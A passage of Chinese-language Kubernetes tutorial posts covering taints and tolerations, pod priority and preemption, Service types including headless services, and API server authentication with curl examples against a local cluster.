属性，因为判断的是有污点的情况下。\n如果 operator 为 Equal，则表示 key 与 value 之间的关系是 $key=value$\n空 key，并且operator为 Exists，将匹配到所有，即容忍所有污点\n空 effect 匹配所有 effect ，即匹配所有污点；这种情况下加上条件的话，可以容忍所有类型的污点\n驱逐 [7] 当污点设置为 NoExecute这种情况下会驱逐Pod，驱逐条件又如下几个：\n不容忍污点的 pod 会立即被驱逐 容忍污点但未配置 tolerationSeconds 属性的会保持不变，即该节点与Pod保持绑定 容忍指定污点的 pod 并且配置了tolerationSeconds 属性，节点与Pod绑定状态仅在配置的时间内。 Kubernetes内置了一些污点，此时 Controller 会自动污染节点：\nnode.kubernetes.io/not-ready: Node故障。对应 NodeCondition 的Ready = False。\nnode.kubernetes.io/unreachable：Node控制器无法访问节点。对应 NodeCondition Ready= Unknown。\nnode.kubernetes.io/memory-pressure：Node内存压力。\nnode.kubernetes.io/disk-pressure：Node磁盘压力。\nnode.kubernetes.io/pid-pressure：Node有PID压力。\nnode.kubernetes.io/network-unavailable：Node网络不可用。\nnode.kubernetes.io/unschedulable：Node不可调度。\nNotes：Kubernetes node.kubernetes.io/not-ready 属性和 node.kubernetes.io/unreachable 属性添加容差时效 tolerationSeconds=300。即在检测到其中问题后，Pod 将保持绑定5分钟。\n优先级和抢占 kubernetes中也为Pod提供了优先级的机制，有了优先级机制就可以在并行系统中提供抢占机制，有了抢占机制后，当还未调度时，高优先级Pod会比低优先级Pod先被调度，在资源不足时，低优先级Pod可以被高优先级Pod驱逐。\n优先级功能由 PriorityClasses 提供。PriorityClasses 是作为集群级别资源而不是命名空间级别资源，只是用来声明优先级级别。\nvalue 作为优先级级别，数字越大优先级级别越高。而 name 是这个优先级的名称，与其他资源name值相似，值的内容需要符合DNS域名约束。\nglobalDefault 是集群内默认的优先级级别，仅只有一个 PriorityClass 可以设置为 true\napiVersion: scheduling.k8s.io/v1 kind: PriorityClass metadata: name: high-priority value: 1000000 globalDefault: false description: \u0026quot;This priority class should be used for XYZ service pods only.\u0026quot; Notes:\n如果集群内不存在任何 PriorityClass ，则存在的Pod的优先级都为0 当对集群设置了 globalDefault=true 后，不会改变已经存在的 Pod 的优先级。仅对于 PriorityClass globalDefault=true 后创建的 Pod。 如果删除了 PriorityClass ，存在还是使用的这个 PriorityClass 的Pod保持不变，新创建的Pod无法使用这个 PriorityClass 。 非抢占 当 preemptionPolicy: Never 时，Pod不会抢占其他Pod，但不可调度时，会一直在调度队列中等待调度，直到满足要求才会被调度。==非抢占式pod仍可能被其他高优先级的pod抢占==\nNotes：preemptionPolicy在Kubernetes v1.24 [stable]\npreemptionPolicy 是作为非抢占的配置，默认参数为 PreemptLowerPriority；表示了允许高优先级Pod抢占低优先级Pod。如果 preemptionPolicy: Never，代表Pod是非抢占式的。\n下列是一个非抢占式的配置样例\napiVersion: scheduling.k8s.io/v1 kind: PriorityClass metadata: name: high-priority-nonpreempting value: 1000000 preemptionPolicy: Never globalDefault: false description: \u0026quot;This priority class will not cause other pods to be preempted.\u0026quot; 当配置了优先级后，优先级准入控制器会使用 priorityClassName 中配置的对应的 PriorityClass 的 value值来填充当前Pod的优先级，如果没有找到对应抢占策略，则拒绝。\n下面是在Pod中配置优先级的示例\napiVersion: v1 kind: Pod metadata: name: nginx labels: env: test spec: containers: - name: nginx image: nginx imagePullPolicy: IfNotPresent priorityClassName: high-priority 抢占 当创建Pod之后，Pod会进入队列并等待被调度。scheduler 从队列中选择一个 Pod 并尝试将其调度到一个节点上。如果没有找到满足 Pod 的所有指定要求的 Node，则为 Pending 的 Pod 触发抢占。当Pod在找合适的节点时，即试图抢占一个节点，会在这个Node中删除一个或多个优先级低于当前Pod的Pod，使当前Pod能够被调度到对应的Node上。当低优先级Pod被驱逐后，当前Pod可以被调度到该Node，这个过程被称为抢占 preemption。\n而提供可驱逐资源的Node成为被提名Node（nominated Node ），在当Pod抢占到一个Node时，其 nominatedNodeName 会被标注为这个 Node的名称，当然标注后也不一定，一定是被抢占到这个Node之上，例如，当前Pod在等待驱逐低优先级Pod的过程中，有其他节点变成可用节点 FN 时，这个时候Pod会被抢占到这个节点。\nReference [1] 创建一个会被调度到特定节点上的 Pod\n[2] nodeSelector\n[3] labels annotations taints\n[4] affinity and anti-affinity\n[5] inter pod affinity and anti affinity\n[6] taint and toleration\n[7] evictions\n[8] pod priority preemption\n","permalink":"https://www.oomkill.com/2018/09/kubernetes-schedule/","summary":"","title":"kubernetes概念 - kubernetes调度"},{"content":"在Kubernetes集群中，Pod是有生命周期的，为了能够给对应的客户端提供一个固定访问端点，因此在客户端与服务端（Pod之间）添加了一个固定中间层，这个中间层被称之为Service。Service的工作严重依赖于在Kubernetes集群之上，部署的附件Kubernetes DNS服务。较新版本使用的coreDNS，1.11之前使用的KubeDNS。\nservice的名称解析是强依赖于DNS附件的。因此在部署完Kubernetes后，需要部署CoreDNS或KubeDNS。 Kubernetes要想向客户端提供网络功能，依赖于第三方方案，在较新版本中，可通过CNI容器网络插件标准接口，来接入任何遵循插件标准的第三方方案。 Service从一定程度上来说，在每个节点之上都工作有一个组件Kube-proxy，Kube-proxy将始终监视apiserver当中，有关service资源的变动状态。此过程是通过Kubernetes中固有的请求方法watch来实现的。一旦有service资源的内容发生变动，kube-proxy都将其转换为当前节点之上的能够实现service资源调度至特定Pod之上的规则。\nservice实现方式 在Kubernetes中service的实现方式有三种模型。\nuserspace 用户空间，可以理解为，用户的请求。 1.1之前包括1.1使用此模型。 用户的请求到达当前节点的内核空间的iptables规则（service规则），由service转发至本地监听的某个套接字上的用户空间的kube-proxy，kube-proxy在处理完再转发给service，最终代理至service相关联的各个Pod，实现调度。\niptables 1.10- 客户端IP请求时，直接请求serviceIP，IP为本地内核空间中的service规则所截取，并直接调度至相关Pod。service工作在内核空间，由iptables直接调度。\nipvs 1.11默认使用，如IPVS没有激活，默认降级为iptables 客户端请求到达内核空间后，直接由ipvs规则直接调度至Pod网络地址范围内的相关Pod资源。\n使用清单创建service资源 SVC中的kubernetes service是集群中各Pod需要与Kubernetes集群apiserver联系时需要通过此svc地址联系。这个地址是集群内的apiserver服务地址。\nservice类型 ClusterIP 默认值，表示分配集群IP地址，仅用于集群内通信。自动分配地址，如需固定，需要指定相应地址，在创建后无法修改。当使用ClusterIP时，只有两个端口有用，port与targetPort\nNodePort 接入集群外部流量，默认分配的端口是30000~32767\nLoadBalancer 表示将Kubernetes部署在虚拟机上，虚拟机是工作在云环境中，云环境支持lbaas（负载均衡及服务的一键调用）。\nExternaName 表示将集群外部服务引用到集群内部中来，在集群内部直接使用。\nspec:\rports: # 将哪个端口与后端容器端口建立关联关系。\r- port # service对外提供服务的端口\rname 指明port的名称\rtargetPort # 容器的端口\rnodePort # 只有类型为NodePort时，才有必要用节点端口，否则此选项是无用的。\rprotocol 协议，默认TCP\rseletcor 关联到哪些Pod资源上\rapp: redis\rrun: redis\rclusterIP: # clusterIP可以动态分贝可以不配置\rtype: ClusterIP\rapiVersion: v1\rkind: Service\rmetadata:\rname: redis\rnamespace: default\rspec:\rselector: run: redis\rclusterIP: 10.96.100.0\rtype: ClusterIP\rports: - port: 6379\rtargetPort: 6379\rservice到Pod是有一个中间层的，service会先到endpoints资源(==标准的Kubernetes对象==)， 地址加端口，而后由endpoints关联至后端Pod。\n$ kubectl describe svc redis\rName: redis\rNamespace: default\rLabels: \u0026lt;none\u0026gt;\rAnnotations: kubectl.kubernetes.io/last-applied-configuration:\r{\u0026quot;apiVersion\u0026quot;:\u0026quot;v1\u0026quot;,\u0026quot;kind\u0026quot;:\u0026quot;Service\u0026quot;,\u0026quot;metadata\u0026quot;:{\u0026quot;annotations\u0026quot;:{},\u0026quot;name\u0026quot;:\u0026quot;redis\u0026quot;,\u0026quot;namespace\u0026quot;:\u0026quot;default\u0026quot;},\u0026quot;spec\u0026quot;:{\u0026quot;clusterIP\u0026quot;:\u0026quot;10.96.100.0\u0026quot;,...\rSelector: run=redis\rType: ClusterIP\rIP: 10.96.100.0\rPort: \u0026lt;unset\u0026gt; 6379/TCP\rTargetPort: 6379/TCP\rEndpoints: 10.244.0.5:6379,10.244.1.4:6379\rSession Affinity: None\rEvents: \u0026lt;none\u0026gt;\rservice创建完成后，只要kubernetes集群中的DNS是存在的，就可以直接解析其服务名每一个service创建完后，都会在集群DNS中动态添加一个资源记录（不止一个）。\n资源记录的默认格式为，==SVC_NAME.NS_NAME.DOMAIN.LTD.==，==DOMAIN.LTD== 默认是 ==svc.cluster.local==。故redis-svc的资源记录为redis.default.svc.cluster.local.\nnodePort SVC apiVersion: v1\rkind: Service\rmetadata:\rname: redis1\rnamespace: default\rspec:\rselector: run: redis\rclusterIP: 10.96.100.1\rtype: NodePort\rports: - port: 6380\rtargetPort: 6379\rnodePort: 30001\rExternalName 在本地局域网环境中，但是在Kubernetes集群之外，或者在互联网之上的服务，我们==期望此服务让集群内的服务可访问到==，集群内部使用的都是私网地址，就算可以将请求路由出去，离开本地网络到外部，外部的相应报文也无法回到Kubernetes集群内网中。此时无法正常通信。\nExternalName用于实现，在集群中创建service， 此service端点不是本地Pod，而是service关联至外部服务上。当集群内部客户端区访问service时，由service通过层级转换，请求到外部的服务，外部报文响应给NodeIP，再由NodeIP转交至service，再由service转发至Pod，从而使Pod可访问集群外部服务。\n$ kubectl explain svc.spec.externalName\rKIND: Service\rVERSION: v1\rFIELD: externalName \u0026lt;string\u0026gt;\rService在实现负载均衡时，还支持sessionAffinity会话粘性，默认情况下基于源IP做粘性的，ClientIP、None(默认)。\nsessionAffinity在service内部实现session保持。支持两种模式 ClusterIP None。设置ClusterIP为，将同一个客户端IP调度到同一个后端Pod。\n无头service (headless) 在访问service时，解析的应为service名称，每个service有其响应的service名称，解析至其ClusterIP，由service调度（dnat）至后端Pod，因此名称解析结果只会有一个ClusterIP。\n所谓headless service，即在解析Service IP时，==无Service ClusterIP，此时，解析服务名时会解析至后端Pod IP之上==，IP数量取决于Pod的数量。这种service被称为headless service。\n设置方式\nClusterIP: none\r$ kubectl get svc\rNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE\rkubernetes ClusterIP 10.96.0.1 \u0026lt;none\u0026gt; 443/TCP 15h\rnginx ClusterIP None \u0026lt;none\u0026gt; 80/TCP 5s\r$ dig -t A nginx.default.svc.cluster.local. @10.96.0.10\r; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.9.4-RedHat-9.9.4-74.el7_6.1 \u0026lt;\u0026lt;\u0026gt;\u0026gt; -t A nginx.default.svc.cluster.local. @10.96.0.10\r;; global options: +cmd\r;; Got answer:\r;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 59245\r;; flags: qr aa rd; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1\r;; WARNING: recursion requested but not available\r;; OPT PSEUDOSECTION:\r; EDNS: version: 0, flags:; udp: 4096\r;; QUESTION SECTION:\r;nginx.default.svc.cluster.local. IN A\r;; ANSWER SECTION:\rnginx.default.svc.cluster.local. 5 IN A 10.244.0.6\rnginx.default.svc.cluster.local. 5 IN A 10.244.1.5\r;; Query time: 1 msec\r;; SERVER: 10.96.0.10#53(10.96.0.10)\r;; WHEN: 一 7月 08 13:24:47 CST 2019\r;; MSG SIZE rcvd: 154\r$ kubectl get pods -o wide -l run=nginx\rNAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES\rnginx-7db9fccd9b-h72bb 1/1 Running 0 14m 10.244.1.5 node01 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt;\rnginx-7db9fccd9b-mrv95 1/1 Running 0 14m 10.244.0.6 node02 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt;\r","permalink":"https://www.oomkill.com/2018/09/kubernetes-service/","summary":"","title":"kubernetes概念 - Service"},{"content":"在整个Kubernetes集群来讲 apiserver是访问控制的唯一入口。如通过service或ingress暴露之后，是可以不通过apiserver接入的，只需要通过节点的nodePort或者ingress controller daemonset共享宿主机节点网络名称空间监听的宿主机网络地址（节点地址），直接接入。\n当请求到达APIServer时，会经历几个阶段，如图所示\n图：Kubernetes API 请求的请求处理步骤图\rSource：https://kubevious.io/blog/post/securing-kubernetes-using-pod-security-policy-admission-controller\r任何用户（sa与人类用户）在通过任何方式试图操作API资源时，必须要经历下列的操作：\nAuthentication，这个步骤在建立TLS连接后，验证包含，证书、密码，Token；可以指定多种认证，依次尝试每一个，直到其中一个认证成功。如果认证失败，此时客户端收到的是401。 Authorization，此步骤是在完成 Authentication 后确定了来源用户，此时用户的请求动作必须被授权。如bob用户对pod资源有 get , list 权限操作。如果 Admission Control：此步骤为图3，与 Authorization 不同的时，这里只要有任意准入控制器拒绝，则拒绝；多个准入控制器会按顺序执行 Refer to controlling access\n认证 Kubernetes是高度模块化设计的，因此其认证授权与准入控制是各自都通过插件的方式，可由用户自定义选择经由什么样的插件来完成何种控制逻辑。如对称秘钥认证方式、令牌认证。由于Kubernetes提供的是resetful方式的接口，其服务都是通过HTTP协议提供的，因此认证信息只能经由HTTP协议的认证首部进行传递，此认证首部通常被称作认证令牌(token)。\nssl认证，对于Kubernetes访问来讲，ssl证书能让客户端去确认服务器的身份，（要求服务端发送服务端证书，确认证书是否为认可的CA签署的。）在Kubernetes通信过程当中，重要的是服务器还需认证客户端的身份，因此==Kubectl也应有一个证书，并且此证书为server端所认可的CA所签署的证书==。并且客户端身份也要与证书当中标识的身份保持一致。双方需互相做双向证书认证。认证之后双方基于SSL会话实现加密通讯。\n注：kubernetes认证无需执行串行检查，用户经过任何一个认证插件通过后，即表示认证通过，无需再经由其他插件进行检查。\n授权 kubernetes的授权也支持多种授权插件来完成用户的权限检查，kubernetes 1.6之后开始支持基于RBAC的认证。除此只外还有基于节点的认证、webhook基于http回调机制，通过web的rest服务来实现认证的检查机制。最重要的是RBAC的授权检查机制。基于角色的访问控制，通常只有许可授权，没有拒绝授权。默认都是拒绝。\n在默认情况下，使用kubeadm部署Kubernetes集群是强制启用了RBAC认证的。\n准入控制 一般而言，准入控制本身只是用来定义对应授权检查完成之后的后续其他安全检查操作的。\n用户账号 一般而言用户账号大体上应具有以下信息\nuser 用户，一般而言由username与userid组成。\ngroup 用户组\nextra 用来提供额外信息\nAPI资源 k8sapiserver是分组的，向哪个组，哪个版本的哪个api资源对象发出请求必须进行标识，所有的请求资源通过url path进行标识的。如 /apis/apps/v1/，所有名称空间级别的资源在访问时一般都需指名namespaces关键词，并给出namespaces名称来获取 /apis/apps/v1/namespaces/default/ /apis/apps/v1/namespaces/default/nginx 。\n一个完整意义上的url 对象引用url格式 ==/apis/\u0026lt;GROUPS\u0026gt;/\u0026lt;VERSION\u0026gt;/namespaces/\u0026lt;NameSpace_name\u0026gt;/\u0026lt;Kind\u0026gt;/[/object_id]==\n$ kubectl api-versions\radmissionregistration.k8s.io/v1beta1\r...\rKubernetes中，所有的api都取决于一个根 /apis\n$ curl -k --cert /etc/k8s/pki/apiserver-kubelet-client.crt --key /etc/k8s/pki/apiserver-kubelet-client.key https://localhost:6443/apis/apps/v1/namespaces/typay/deployments/nginx-ingress-controller\r{\r\u0026quot;kind\u0026quot;: \u0026quot;Deployment\u0026quot;,\r\u0026quot;apiVersion\u0026quot;: \u0026quot;apps/v1\u0026quot;,\r\u0026quot;metadata\u0026quot;: {\r\u0026quot;name\u0026quot;: \u0026quot;nginx-ingress-controller\u0026quot;,\r\u0026quot;namespace\u0026quot;: \u0026quot;houtu\u0026quot;,\r\u0026quot;selfLink\u0026quot;: \u0026quot;/apis/apps/v1/namespaces/houtu/deployments/nginx-ingress-controller\u0026quot;,\r\u0026quot;uid\u0026quot;: \u0026quot;dc8cbca7-fcab-49c5-a4f4-b44858bbf603\u0026quot;,\r\u0026quot;resourceVersion\u0026quot;: \u0026quot;225525\u0026quot;,\r\u0026quot;generation\u0026quot;: 4,\r\u0026quot;creationTimestamp\u0026quot;: \u0026quot;2019-11-21T12:47:33Z\u0026quot;,\r\u0026quot;labels\u0026quot;: {\r\u0026quot;k8s-app\u0026quot;: \u0026quot;nginx-ingress-controller\u0026quot;\r},\r\u0026quot;annotations\u0026quot;: {\r\u0026quot;deployment.kubernetes.io/revision\u0026quot;: \u0026quot;4\u0026quot;,\r\u0026quot;kubectl.kubernetes.io/last-applied-configuration\u0026quot;: \u0026quot;{\\\u0026quot;apiVersion\\\u0026quot;:\\\u0026quot;extensions/v1beta1\\\u0026quot;,\\\u0026quot;kind\\\u0026quot;:\\\u0026quot;Deployment\\\u0026quot;,\\\u0026quot;metadata\\\u0026quot;:{\\\u0026quot;annotations\\\u0026quot;:{},\\\u0026quot;labels\\\u0026quot;:{\\\u0026quot;k8s-app\\\u0026quot;:\\\u0026quot;nginx-ingress-controller\\\u0026quot;},\\\u0026quot;name\\\u0026quot;:\\\u0026quot;nginx-ingress-controller\\\u0026quot;,\\\u0026quot;namespace\\\u0026quot;:\\\u0026quot;houtu\\\u0026quot;},\\\u0026quot;spec\\\u0026quot;:{\\\u0026quot;replicas\\\u0026quot;:1,\\\u0026quot;template\\\u0026quot;:{\\\u0026quot;metadata\\\u0026quot;:{\\\u0026quot;labels\\\u0026quot;:{\\\u0026quot;k8s-app\\\u0026quot;:\\\u0026quot;nginx-ingress-controller\\\u0026quot;}},\\\u0026quot;spec\\\u0026quot;:{\\\u0026quot;containers\\\u0026quot;:[{\\\u0026quot;args\\\u0026quot;:[\\\u0026quot;/nginx-ingress-controller\\\u0026quot;,\\\u0026quot;--default-backend-service=houtu/push-front\\\u0026quot;],\\\u0026quot;env\\\u0026quot;:[{\\\u0026quot;name\\\u0026quot;:\\\u0026quot;POD_NAME\\\u0026quot;,\\\u0026quot;valueFrom\\\u0026quot;:{\\\u0026quot;fieldRef\\\u0026quot;:{\\\u0026quot;fieldPath\\\u0026quot;:\\\u0026quot;metadata.name\\\u0026quot;}}},{\\\u0026quot;name\\\u0026quot;:\\\u0026quot;POD_NAMESPACE\\\u0026quot;,\\\u0026quot;valueFrom\\\u0026quot;:{\\\u0026quot;fieldRef\\\u0026quot;:{\\\u0026quot;fieldPath\\\u0026quot;:\\\u0026quot;metadata.namespace\\\u0026quot;}}}],\\\u0026quot;image\\\u0026quot;:\\\u0026quot;quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.26.1\\\u0026quot;,\\\u0026quot;livenessProbe\\\u0026quot;:{\\\u0026quot;httpGet\\\u0026quot;:{\\\u0026quot;path\\\u0026quot;:\\\u0026quot;/healthz\\\u0026quot;,\\\u0026quot;port\\\u0026quot;:10254,\\\u0026quot;scheme\\\u0026quot;:\\\u0026quot;HTTP\\\u0026quot;},\\\u0026quot;initialDelaySeconds\\\u0026quot;:10,\\\u0026quot;timeoutSeconds\\\u0026quot;:1},\\\u0026quot;name\\\u0026quot;:\\\u0026quot;nginx-ingress-controller\\\u0026quot;,\\\u0026quot;ports\\\u0026quot;:[{\\\u0026quot;containerPort\\\u0026quot;:80,\\\u0026quot;hostPort\\\u0026quot;:80},{\\\u0026quot;containerPort\\\u0026quot;:443,\\\u0026quot;hostPort\\\u0026quot;:443}],\\\u0026quot;readinessProbe\\\u0026quot;:{\\\u0026quot;httpGet\\\u0026quot;:{\\\u0026quot;path\\\u0026quot;:\\\u0026quot;/healthz\\\u0026quot;,\\\u0026quot;port\\\u0026quot;:10254,\\\u0026quot;scheme\\\u0026quot;:\\\u0026quot;HTTP\\\u0026quot;}}}],\\\u0026quot;hostNetwork\\\u0026quot;:true,\\\u0026quot;serviceAccountName\\\u0026quot;:\\\u0026quot;nginx-ingress-serviceaccount\\\u0026quot;,\\\u0026quot;terminationGracePeriodSeconds\\\u0026quot;:60}}}}\\n\u0026quot;\r}\r},\r\u0026quot;spec\u0026quot;: {\r\u0026quot;replicas\u0026quot;: 1,\r\u0026quot;selector\u0026quot;: {\r\u0026quot;matchLabels\u0026quot;: {\r\u0026quot;k8s-app\u0026quot;: \u0026quot;nginx-ingress-controller\u0026quot;\r}\r},\r\u0026quot;template\u0026quot;: {\r\u0026quot;metadata\u0026quot;: {\r\u0026quot;creationTimestamp\u0026quot;: null,\r\u0026quot;labels\u0026quot;: {\r\u0026quot;k8s-app\u0026quot;: \u0026quot;nginx-ingress-controller\u0026quot;\r}\r},\r\u0026quot;spec\u0026quot;: {\r\u0026quot;containers\u0026quot;: [\r{\r\u0026quot;name\u0026quot;: \u0026quot;nginx-ingress-controller\u0026quot;,\r\u0026quot;image\u0026quot;: \u0026quot;quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.26.1\u0026quot;,\r\u0026quot;args\u0026quot;: [\r\u0026quot;/nginx-ingress-controller\u0026quot;,\r\u0026quot;--default-backend-service=houtu/push-front\u0026quot;\r],\r\u0026quot;ports\u0026quot;: [\r{\r\u0026quot;hostPort\u0026quot;: 80,\r\u0026quot;containerPort\u0026quot;: 80,\r\u0026quot;protocol\u0026quot;: \u0026quot;TCP\u0026quot;\r},\r{\r\u0026quot;hostPort\u0026quot;: 443,\r\u0026quot;containerPort\u0026quot;: 443,\r\u0026quot;protocol\u0026quot;: \u0026quot;TCP\u0026quot;\r}\r],\r\u0026quot;env\u0026quot;: [\r{\r\u0026quot;name\u0026quot;: \u0026quot;POD_NAME\u0026quot;,\r\u0026quot;valueFrom\u0026quot;: {\r\u0026quot;fieldRef\u0026quot;: {\r\u0026quot;apiVersion\u0026quot;: \u0026quot;v1\u0026quot;,\r\u0026quot;fieldPath\u0026quot;: \u0026quot;metadata.name\u0026quot;\r}\r}\r},\r{\r\u0026quot;name\u0026quot;: \u0026quot;POD_NAMESPACE\u0026quot;,\r\u0026quot;valueFrom\u0026quot;: {\r\u0026quot;fieldRef\u0026quot;: {\r\u0026quot;apiVersion\u0026quot;: \u0026quot;v1\u0026quot;,\r\u0026quot;fieldPath\u0026quot;: \u0026quot;metadata.namespace\u0026quot;\r}\r}\r}\r],\r\u0026quot;resources\u0026quot;: {\r},\r\u0026quot;livenessProbe\u0026quot;: {\r\u0026quot;httpGet\u0026quot;: {\r\u0026quot;path\u0026quot;: \u0026quot;/healthz\u0026quot;,\r\u0026quot;port\u0026quot;: 10254,\r\u0026quot;scheme\u0026quot;: \u0026quot;HTTP\u0026quot;\r},\r\u0026quot;initialDelaySeconds\u0026quot;: 10,\r\u0026quot;timeoutSeconds\u0026quot;: 1,\r\u0026quot;periodSeconds\u0026quot;: 10,\r\u0026quot;successThreshold\u0026quot;: 1,\r\u0026quot;failureThreshold\u0026quot;: 3\r},\r\u0026quot;readinessProbe\u0026quot;: {\r\u0026quot;httpGet\u0026quot;: {\r\u0026quot;path\u0026quot;: \u0026quot;/healthz\u0026quot;,\r\u0026quot;port\u0026quot;: 10254,\r\u0026quot;scheme\u0026quot;: \u0026quot;HTTP\u0026quot;\r},\r\u0026quot;timeoutSeconds\u0026quot;: 1,\r\u0026quot;periodSeconds\u0026quot;: 10,\r\u0026quot;successThreshold\u0026quot;: 1,\r\u0026quot;failureThreshold\u0026quot;: 3\r},\r\u0026quot;terminationMessagePath\u0026quot;: \u0026quot;/dev/termination-log\u0026quot;,\r\u0026quot;terminationMessagePolicy\u0026quot;: \u0026quot;File\u0026quot;,\r\u0026quot;imagePullPolicy\u0026quot;: \u0026quot;IfNotPresent\u0026quot;\r}\r],\r\u0026quot;restartPolicy\u0026quot;: \u0026quot;Always\u0026quot;,\r\u0026quot;terminationGracePeriodSeconds\u0026quot;: 60,\r\u0026quot;dnsPolicy\u0026quot;: \u0026quot;ClusterFirst\u0026quot;,\r\u0026quot;serviceAccountName\u0026quot;: \u0026quot;nginx-ingress-serviceaccount\u0026quot;,\r\u0026quot;serviceAccount\u0026quot;: \u0026quot;nginx-ingress-serviceaccount\u0026quot;,\r\u0026quot;hostNetwork\u0026quot;: true,\r\u0026quot;securityContext\u0026quot;: {\r},\r\u0026quot;schedulerName\u0026quot;: \u0026quot;default-scheduler\u0026quot;\r}\r},\r\u0026quot;strategy\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;RollingUpdate\u0026quot;,\r\u0026quot;rollingUpdate\u0026quot;: {\r\u0026quot;maxUnavailable\u0026quot;: 1,\r\u0026quot;maxSurge\u0026quot;: 1\r}\r},\r\u0026quot;revisionHistoryLimit\u0026quot;: 2147483647,\r\u0026quot;progressDeadlineSeconds\u0026quot;: 2147483647\r},\r\u0026quot;status\u0026quot;: {\r\u0026quot;observedGeneration\u0026quot;: 4,\r\u0026quot;replicas\u0026quot;: 1,\r\u0026quot;updatedReplicas\u0026quot;: 1,\r\u0026quot;unavailableReplicas\u0026quot;: 1,\r\u0026quot;conditions\u0026quot;: [\r{\r\u0026quot;type\u0026quot;: \u0026quot;Available\u0026quot;,\r\u0026quot;status\u0026quot;: \u0026quot;True\u0026quot;,\r\u0026quot;lastUpdateTime\u0026quot;: \u0026quot;2019-11-21T12:47:33Z\u0026quot;,\r\u0026quot;lastTransitionTime\u0026quot;: \u0026quot;2019-11-21T12:47:33Z\u0026quot;,\r\u0026quot;reason\u0026quot;: \u0026quot;MinimumReplicasAvailable\u0026quot;,\r\u0026quot;message\u0026quot;: \u0026quot;Deployment has minimum availability.\u0026quot;\r}\r]\r}\r}\r$ curl -k --cert /etc/k8s/pki/apiserver-kubelet-client.crt --key /etc/k8s/pki/apiserver-kubelet-client.key https://localhost:6443/api/v1/namespaces/houtu\r{\r\u0026quot;kind\u0026quot;: \u0026quot;Namespace\u0026quot;,\r\u0026quot;apiVersion\u0026quot;: \u0026quot;v1\u0026quot;,\r\u0026quot;metadata\u0026quot;: {\r\u0026quot;name\u0026quot;: \u0026quot;houtu\u0026quot;,\r\u0026quot;selfLink\u0026quot;: \u0026quot;/api/v1/namespaces/houtu\u0026quot;,\r\u0026quot;uid\u0026quot;: \u0026quot;da736612-d112-4e38-8546-0f2b9169b92f\u0026quot;,\r\u0026quot;resourceVersion\u0026quot;: \u0026quot;201510\u0026quot;,\r\u0026quot;creationTimestamp\u0026quot;: \u0026quot;2019-11-21T08:33:38Z\u0026quot;\r},\r\u0026quot;spec\u0026quot;: {\r\u0026quot;finalizers\u0026quot;: [\r\u0026quot;kubernetes\u0026quot;\r]\r},\r\u0026quot;status\u0026quot;: {\r\u0026quot;phase\u0026quot;: \u0026quot;Active\u0026quot;\r}\r}\r删除操作\n$ curl X DELETE -k --cert /etc/k8s/pki/apiserver-kubelet-client.crt --key /etc/k8s/pki/apiserver-kubelet-client.key https://localhost:6443/apis/apps/v1/namespaces/default/deployments/nginx-test/\r{\r\u0026quot;kind\u0026quot;: \u0026quot;Status\u0026quot;,\r\u0026quot;apiVersion\u0026quot;: \u0026quot;v1\u0026quot;,\r\u0026quot;metadata\u0026quot;: {\r},\r\u0026quot;status\u0026quot;: \u0026quot;Success\u0026quot;,\r\u0026quot;details\u0026quot;: {\r\u0026quot;name\u0026quot;: \u0026quot;nginx-test\u0026quot;,\r\u0026quot;group\u0026quot;: \u0026quot;apps\u0026quot;,\r\u0026quot;kind\u0026quot;: \u0026quot;deployments\u0026quot;,\r\u0026quot;uid\u0026quot;: \u0026quot;12c5184c-82bc-4f7d-8ec8-38a2439983cf\u0026quot;\r}\r}\r$ kubectl get deploy\rNo resources found.\r在Kubernetes之上，来自于那些地方的客户端需要和apiserver打交道\n集群外部客户端，通过apiserver对外通信的监听地址 集群之上的客户端，apiserver拥有一个在集群内工作地址，``kubectl get svc` 查看，kubernetes是将apiserver以service方式引入到集群内部，从而使得Pod直接请求集群上的apiserver的服务了。 Pod在请求apiserver上的服务是通过10.96.0.1来进行的。但是apiserver请求是需要做认证的。首先apiserver将自己证书传递给客户端，客户端去校验服务端(apiserver)身份。 服务器发给每个Pod客户端的时候，证书所标明的身份的地址为10.96.0.1，所以在apiserver上手动创建证书，必须要确保证书持有者名称能够解析到两条IP记录才可以。\n$ kubectl get svc\rNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE\rkubernetes ClusterIP 10.96.0.1 \u0026lt;none\u0026gt; 443/TCP 47h\r$ kubectl describe svc kubernetes\rName: kubernetes\rNamespace: default\rLabels: component=apiserver\rprovider=kubernetes\rAnnotations: \u0026lt;none\u0026gt;\rSelector: \u0026lt;none\u0026gt;\rType: ClusterIP\rIP: 10.96.0.1\rPort: https 443/TCP\rTargetPort: 6443/TCP\rEndpoints: 172.31.71.50:6443\rSession Affinity: None\rEvents: \u0026lt;none\u0026gt;\r类型分类\n对象类 deployment、namespace都属于对象类。 同一类型下的所有对象的集合在reset风格API下叫集合，在Kubernetes中被称之为列表（list）。 xx Kubernetes api账户有两类，真实的账户（人用的账户）userAccount与==Pod客户端serviceAccount==（Pod连接apiserver使用的账户）。\n每个Pod无论你定义与否，都会挂载一个存储卷，这就是Podservice认证时的认证信息，通过secret定义存储卷的方式关联到Pod上，从而使Pod内运行的应用，通次secret保存的认证信息，来连接apiserver并完成认证。\n在每一个名称空间当中都存在一个默认的secret，default-token-xxx，这是让当前名称空间当中所有的Pod资源试图去连接apiserver时，隐藏的、预制的一个认证信息。所以所有的Pod都能直接连接apiserver。此secret所包含的认证信息仅仅是获取当前Pod自身的属性。\n给Pod增加自定义服务账号。 serviceAccount也属于标准的Kubernetes资源，可以自行创建serviceAccount，由自定义Pod使用serviceAccountName去加载自定义serviceAccount。serviceAccount是一个可以使用命令行创建的简单资源对象，可以使用kubectl create serviceaccount，创建也可以使用资源清单进行创建。\n语法\nkubectl create serviceaccount {Name} -o yaml 